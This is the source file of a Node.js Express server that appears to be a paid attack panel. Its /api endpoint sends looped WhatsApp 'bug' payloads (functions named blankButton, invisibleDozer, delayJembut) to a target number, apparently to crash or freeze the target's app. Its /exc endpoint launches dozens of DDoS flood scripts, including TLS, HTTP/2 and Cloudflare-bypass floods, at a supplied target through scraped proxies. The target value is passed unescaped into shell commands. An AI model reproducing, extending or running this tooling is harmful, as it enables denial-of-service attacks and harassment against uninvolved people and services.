console.clear();
const express = require('express');
const cors = require('cors');
const fs = require('fs');
const { exec } = require('child_process');
const axios = require("axios");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
  makeCacheableSignalKeyStore
} = require('ell-bail');
const pino = require('pino');
const { Boom } = require('@hapi/boom');
const chalk = require('chalk');
const fetch = require("node-fetch");
const path = require("path");
let sock = {};
const app = express();
const PORT = process.env.PORT || process.env.SERVER_PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

const usePairingCode = true;

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

const usersFile = path.join(__dirname, 'assets', 'users.json');

function readUsers() {
  try {
    if (!fs.existsSync(usersFile)) return [];
    const data = fs.readFileSync(usersFile, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    console.error('Error reading users file:', error);
    return [];
  }
}

function writeUsers(users) {
  try {
    const dir = path.dirname(usersFile);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(usersFile, JSON.stringify(users, null, 2));
    return true;
  } catch (error) {
    console.error('Error writing users file:', error);
    return false;
  }
}

let sessions = new Map();
let pairingCodes = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });
if (!fs.existsSync(SESSIONS_FILE)) fs.writeFileSync(SESSIONS_FILE, JSON.stringify([]));

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) sessions.push(...existing, botNumber);
    } else sessions.push(botNumber);
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);
      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        sock = makeWASocket({
          printQRInTerminal: !usePairingCode,
          syncFullHistory: true,
          markOnlineOnsockect: true,
          sockectTimeoutMs: 60000,
          defaultQueryTimeoutMs: 0,
          keepAliveIntervalMs: 10000,
          generateHighQualityLinkPreview: true,
          patchMessageBeforeSending: (message) => {
            const requiresPatch = !!(message.buttonsMessage || message.templateMessage || message.listMessage);
            if (requiresPatch) {
              message = {
                viewOnceMessage: {
                  message: {
                    messageContextInfo: { deviceListMetadataVersion: 2, deviceListMetadata: {} },
                    ...message
                  }
                }
              };
            }
            return message;
          },
          version: (await (await fetch('https://raw.githubusercontent.com/WhiskeySockets/Baileys/master/src/Defaults/baileys-version.json')).json()).version,
          browser: ["Ubuntu", "Chrome", "20.0.04"],
          logger: pino({ level: 'fatal' }),
          auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino().child({ level: 'silent', stream: 'store' }))
          }
        });
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else reject(new Error("Koneksi ditutup"));
            }
          });
          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
  return deviceDir;
}

async function connectToWhatsApp(botNumber) {
  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  sock = makeWASocket({
    printQRInTerminal: !usePairingCode,
    syncFullHistory: true,
    markOnlineOnsockect: true,
    sockectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 0,
    keepAliveIntervalMs: 10000,
    generateHighQualityLinkPreview: true,
    patchMessageBeforeSending: (message) => {
      const requiresPatch = !!(message.buttonsMessage || message.templateMessage || message.listMessage);
      if (requiresPatch) {
        message = {
          viewOnceMessage: {
            message: {
              messageContextInfo: { deviceListMetadataVersion: 2, deviceListMetadata: {} },
              ...message
            }
          }
        };
      }
      return message;
    },
    version: (await (await fetch('https://raw.githubusercontent.com/WhiskeySockets/Baileys/master/src/Defaults/baileys-version.json')).json()).version,
    browser: ["Ubuntu", "Chrome", "20.0.04"],
    logger: pino({ level: 'fatal' }),
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, pino().child({ level: 'silent', stream: 'store' }))
    }
  });
  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) await connectToWhatsApp(botNumber);
      else {
        try {
          sessions.delete(botNumber);
          pairingCodes.delete(botNumber);
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      pairingCodes.delete(botNumber);
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, "WANGLINN");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          pairingCodes.set(botNumber, code);
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        sessions.delete(botNumber);
        pairingCodes.delete(botNumber);
      }
    }
  });
  sock.ev.on("creds.update", saveCreds);
  return sock;
}

app.get('/api', async (req, res) => {
  const { target, type } = req.query;
  if (!target || !type) return res.status(400).json({ error: 'Missing parameters: chatId or type' });
  try {
    res.json({ status: true, message: 'bug sent successfully!', target: target });
    const targetJid = target + "@s.whatsapp.net";
    const { blankButton, Blank2, crsA, bClck, invisibleDozer, delayJembut, threepelDelayInvis } = require("./assets/function.js");

    async function delayv1(x) {
      for (let i = 0; i <= 400; i++) {
        await delayJembut(sock, x)
        await delayJembut(sock, x)
        await delayJembut(sock, x)
        await sleep(1000)
      }
    }

    async function delayv2(x) {
      for (let i = 0; i < 1000; i++) {
        await threepelDelayInvis(sock, x)
        await threepelDelayInvis(sock, x)
        await sleep(1000)
        console.log(chalk.red(target + " send delay 1000/" + `${i + 1}`))
      }
    }

    async function blank(x) {
      for (let i = 0; i < 100; i++) {
        await blankButton(sock, x)
        await sleep(1000)
        await Blank2(sock, x)
        await sleep(1000);
        await crsA(sock, x)
        await bClck(sock, x)
      }
    }

    async function blankv2(x) {
      for (let i = 0; i < 100; i++) {
        await blankButton(sock, x)
        await sleep(1000)
        await Blank2(sock, x)
        await sleep(1000);
        await crsA(sock, x)
        await bClck(sock, x)
      }
    }

    async function dozer(x) {
      for (let i = 0; i < 1000; i++) {
        await invisibleDozer(sock, x);
        await invisibleDozer(sock, x);
        await invisibleDozer(sock, x);
        await sleep(1000)
      }
    }

    if (type === "delayv1") {
    await delayv1(targetJid);
} else if (type === "delayv2") {
    await delayv2(targetJid);
} else if (type === "blankv2") {
    await blankv2(targetJid);
} else if (type === "blank") {
    await blank(targetJid);
} else if (type === "dozer") {
    await dozer(targetJid);
}


    console.log("Successfully sent undefined bug.");
  } catch (error) {
    console.error('Error sending message:', error);
    res.status(500).json({ message: 'Failed to send message', details: error.toString() });
  }
});

async function startIp() {
  const r = await axios.get('https://httpbin.org/get');
  const data = r.data;
  const ip = data.origin;
  const x = `module.exports = {
  api: "http://${ip}:${PORT}/api",
  web: "http://${ip}:${PORT}/web"
}`;
  const xf = path.join(__dirname, "data.json");
  fs.writeFileSync(xf, x);
  
  const text = `
=========================================
# HTTP API : ${chalk.bgRed(`http://${ip}:${PORT}`)}
=========================================
> check in data.json file to copy ip:port`;
  
  console.clear();
  console.log(chalk.blue.bold(text));
}

app.get('/web', (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const users = readUsers();
  const user = users.find(u => u.username === username && u.password === password);

  if (user) {
    res.json({ 
      username: user.username, 
      role: user.role, 
      status: 'Active', 
      expired: user.expired || 'Never' 
    });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});
app.get('/users', (req, res) => {
  const users = readUsers();
  res.json(users);
});

app.delete('/users/:username', (req, res) => {
  const { username } = req.params;
  const users = readUsers();
  const filteredUsers = users.filter(u => u.username !== username);
  
  if (writeUsers(filteredUsers)) {
    res.json({ message: 'User deleted successfully' });
  } else {
    res.status(500).json({ error: 'Failed to delete user' });
  }
});
app.get('/totaluser', (req, res) => {
  const users = readUsers();
  const totalUsers = users.length;
  const activeUsers = users.filter(u => u.status === 'active').length;
  const ts = JSON.parse(fs.readFileSync(SESSIONS_FILE));
  res.json({
      totalUsers,
      activeUsers,
      activeBots: ts.length, 
      connectedSessions: ts.length
  });
});

app.get('/verify-user', (req, res) => {
  const { username } = req.query;
  const users = readUsers();
  const user = users.find(u => u.username === username);
  if (user) res.status(200).json({ valid: true });
  else res.status(404).json({ valid: false });
});

app.post('/addsender', (req, res) => {
  const { botNumber } = req.body;
  if (!botNumber || !/^\d+$/.test(botNumber)) return res.status(400).json({ error: 'Invalid bot number' });
  if (sessions.has(botNumber)) return res.status(400).json({ error: 'Bot already connected' });
  connectToWhatsApp(botNumber).then(() => {
    setTimeout(() => {
      const pairingCode = pairingCodes.get(botNumber);
      res.json({ message: 'Bot added successfully', pairingCode: pairingCode });
    }, 5000);
  }).catch(error => {
    console.error('Error adding sender:', error);
    res.status(500).json({ error: 'Failed to add bot' });
  });
});

app.get('/check-session', (req, res) => {
  const { botNumber } = req.query;
  if (!botNumber) return res.status(400).json({ error: 'Bot number required' });
  const connected = sessions.has(botNumber);
  const connecting = pairingCodes.has(botNumber) && !connected;
  res.json({ connected, connecting, hasPairingCode: pairingCodes.has(botNumber) });
});

app.post('/adduser', (req, res) => {
  const { username, password, role, expiry } = req.body;
  const users = readUsers();
  if (users.find(u => u.username === username)) return res.status(400).json({ error: 'User already exists' });

  const expiryDate = new Date();
  expiryDate.setDate(expiryDate.getDate() + parseInt(expiry));
  const newUser = {
    username,
    password,
    role: role || 'user',
    status: 'active',
    created: new Date().toISOString(),
    expired: expiryDate.toISOString().split('T')[0]
  };
  users.push(newUser);

  if (writeUsers(users)) res.json({ message: 'User added successfully' });
  else res.status(500).json({ error: 'Failed to add user' });
});

app.post('/exc', (req, res) => {
  const { target, time, method } = req.query;
  res.json({ success: true, message: 'API request received. Executing', target, time, method });

  if (method === 'kill') {
    exec(`node ./assets/methods/H2CA.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/HDRH2.js ${target} ${time} 10 100 true`);
    exec(`node ./assets/methods/H2F3.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/BLAST.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
  } else if (method === 'KOMIX') {
    exec(`node ./assets/methods/HTTP.js ${target} ${time}`);
    exec(`node ./assets/methods/HTTPS.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/HTTPX.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/BLAST.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/MIXMAX.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
  } else if (method === 'R2') {
    exec(`node ./assets/methods/TLS.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/R2.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/RAND.js ${target} ${time}`);
    exec(`node ./assets/methods/BLAST.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
  } else if (method === 'PSHT') {
    exec(`node ./assets/methods/H2CA.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/HDRH2.js ${target} ${time} 10 100 true`);
    exec(`node ./assets/methods/H2F3.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/HTTP.js ${target} ${time}`);
    exec(`node ./assets/methods/RAND.js ${target} ${time}`);
    exec(`node ./assets/methods/TLS.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/R2.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/HTTPS.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/HTTPX.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/BLAST.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
  } else if (method === 'pidoras') {
    exec(`node ./assets/methods/H2CA.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/pidoras.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/floods.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/browser.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/HDRH2.js ${target} ${time} 10 100 true`);
    exec(`node ./assets/methods/H2F3.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/HTTP.js ${target} ${time}`);
    exec(`node ./assets/methods/Cloudflare.js ${target} ${time} 100`);
    exec(`node ./assets/methods/RAND.js ${target} ${time}`);
    exec(`node ./assets/methods/TLS.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/R2.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/HTTPS.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/HTTP-RAW.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/HTTPX.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/BLAST.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
  } else if (method === 'exercist') {
    exec(`node ./assets/methods/novaria.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/pidoras.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/floods.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/browser.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/CBROWSER.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/H2CA.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/H2F3.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/H2GEC.js ${target} ${time} 100 10 3 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/HTTP.js ${target} ${time}`);
    exec(`node ./assets/methods/FLUTRA.js ${target} ${time}`);
    exec(`node ./assets/methods/Cloudflare.js ${target} ${time} 100`);
    exec(`node ./assets/methods/CFbypass.js ${target} ${time}`);
    exec(`node ./assets/methods/bypassv1 ${target} ./assets/methods/proxy.txt ${time} 100 10`);
    exec(`node ./assets/methods/hyper.js ${target} ${time} 100`);
    exec(`node ./assets/methods/RAND.js ${target} ${time}`);
    exec(`node ./assets/methods/TLS.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/TLS-LOST.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/TLS-BYPASS.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/tls.vip ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/R2.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/HTTPS.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/HTTPX.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/BLAST.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
  } else {
    exec(`node ./assets/methods/novaria.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/pidoras.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/floods.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/browser.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/CBROWSER.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/H2CA.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/H2F3.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/H2GEC.js ${target} ${time} 100 10 3 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/HTTP.js ${target} ${time}`);
    exec(`node ./assets/methods/FLUTRA.js ${target} ${time}`);
    exec(`node ./assets/methods/Cloudflare.js ${target} ${time} 100`);
    exec(`node ./assets/methods/CFbypass.js ${target} ${time}`);
    exec(`node ./assets/methods/bypassv1 ${target} ./assets/methods/proxy.txt ${time} 100 10`);
    exec(`node ./assets/methods/hyper.js ${target} ${time} 100`);
    exec(`node ./assets/methods/RAND.js ${target} ${time}`);
    exec(`node ./assets/methods/TLS.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/TLS-LOST.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/TLS-BYPASS.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/tls.vip ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/R2.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/HTTPS.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/HTTPX.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
    exec(`node ./assets/methods/BLAST.js ${target} ${time} 100 10 ./assets/methods/proxy.txt`);
  }
});

async function scrapeProxies() {
  const proxySources = [
    "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&proxy_format=ipport&format=text&timeout=20000",
    "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/http.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/https.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/https.txt",
    "https://raw.githubusercontent.com/berkay-digital/Proxy-Scraper/main/proxies.txt",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt",
    "https://raw.githubusercontent.com/HumayunShariarHimu/Proxy/main/Anonymous_HTTP_One.md",
    "https://raw.githubusercontent.com/ArrayIterator/proxy-lists/main/proxies/https.txt",
    "https://raw.githubusercontent.com/ArrayIterator/proxy-lists/main/proxies/http.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
    "https://raw.githubusercontent.com/zloi-user/hideip.me/main/http.txt",
    "https://raw.githubusercontent.com/zloi-user/hideip.me/main/https.txt",
    "https://raw.githubusercontent.com/elliottophellia/proxylist/master/results/http/global/http_checked.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/https/https.txt",
  ];
  let proxies = [];
  try { if (fs.existsSync("./assets/methods/proxy.txt")) fs.unlinkSync("./assets/methods/proxy.txt"); } catch (error) {}
  for (const source of proxySources) {
    try {
      const response = await axios.get(source);
      proxies = proxies.concat(response.data.split("\n").filter(proxy => proxy.trim() !== ''));
    } catch (error) {}
  }
  try { fs.writeFileSync("./assets/methods/proxy.txt", proxies.join("\n")); } catch (error) {}
}

async function scrapeUserAgent() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/rafael453322/PROXYDT/main/proxy.json.txt');
    const data = await response.text();
    fs.writeFileSync('./assets/methods/ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}

function clearUserAgent() {
  if (fs.existsSync('./assets/methods/ua.txt')) fs.unlinkSync('./assets/methods/ua.txt');
}

async function startBot() {
  await startIp();
  await initializeWhatsAppConnections();
  clearUserAgent();
  await scrapeProxies();
  await scrapeUserAgent();
  app.listen(PORT);
}
process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});
process.on('uncaughtException', (error) => {
  console.error('Uncaught Exception:', error);
});
startBot();